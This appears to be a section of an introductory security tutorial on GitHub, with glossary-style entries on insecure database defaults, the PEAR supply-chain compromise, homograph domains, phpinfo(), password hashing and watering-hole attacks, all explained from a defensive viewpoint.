The problem with coding bootcamps and the rush to use new technology is that people will often use it before truly understanding how it works or how to secure it. This results in data breaches because developers rushed to set something up without really assessing all the attack surface and all the configurations that need to be made in order to make the server secure. Or in the case of MongoDB, in older versions of it, it would accept remote connections by default. They’ve changed it now in newer versions, but it’s still concerning that this was the default. MySQL only allows local connections by default, and you’d have to go out of your way to enable remote access. 

In an /etc/hosts file on a device, 0.0.0.0 means go nowhere. It’s a null route. But for a database or cloud configuration, 0.0.0.0 means allow every IP address.

**PHP PEAR** – PEAR is the PHP Extension and Application Repository, which is a repository of packages for PHP. In 2019, it was revealed that PEAR was hacked and the hackers made PEAR distribute malicious packages instead of legitimate ones, for quite a while before it was discovered and stopped. In this case, the PEAR developers/maintainers/owners themselves were not malicious, but because of poor security on their part, PEAR was able to infect PEAR users. PEAR’s packages are used by PHP developers, so the PEAR-using developers, their apps, and their users who use the apps with the infected packages, could all have been compromised.

This is one reason why you have to be careful about trusting third party code. Everything can get hacked. The more stuff you use, the more likely you are to get hacked.

**Punycode/unicode/homograph attacks** – there are many characters that look similar but are different values. Two digital characters on a computer that look the same but are actually different characters are called homographs. In the context of English, homograph means two words that look the same but mean different things. But in computers, homographs are individual characters. 

A very basic example of a homograph is how an uppercase I (i) looks kind of like a lowercase l (L), at least in certain fonts. Greek, Cyrillic, and Latin all have the letter O, but they are represented differently. 

Unlike ASCII, which only has a few characters, Unicode has tons of characters, which opens up the possibility for more advanced homographs.

Homographs can be used for getting around spam filters, among other things. 

Punycode is how Unicode characters can be in domain names. So a Punycode could use the homograph idea in order to make a website with a Unicode link that looks like a legitimate site. 

Here is an example of a Punycode domain:

```
https://www.аррӏе.com/
```

This is not the apple.com you might think it is. It’s a security researcher’s website that warns the user about Unicode domains. аррӏе.com is a separate website from apple.com even though they appear to be the same.

**phpinfo()** – a built-in function in PHP that lets you see information about the PHP installation and the server it’s running on. If a hacker can get code execution on a server, they might use phpinfo() to see what they’re working with. When you’re doing development and testing, and come across an issue, it might be useful to look at phpinfo(). But it should never be exposed to end users in a production environment.

**Hashing** – all passwords need to be hashed, like if you’re making a full stack web app where people can make accounts, and you’re storing their info in a database. Hashing means that, if someone is able to exfiltrate data from a database, they still can’t do anything with it. Technically, an attacker with exfiltrated password hashes can attempt to crack them, but it can take a while. Hashing might not be perfect, but it’s definitely better than not hashing.

**Watering hole** – if an attacker knows that someone uses a certain website, they can hack it and then put JS-based malware in it, so that the victim will run it in their browser the next time they visit it.

Go to the previous section:
<https://github.com/0x416c616e/intro_to_security/blob/master/01_introduction/introduction.md>

Go to the next section:
<https://github.com/0x416c616e/intro_to_security/blob/master/03_miscellaneous_security/miscellaneous_security.md>
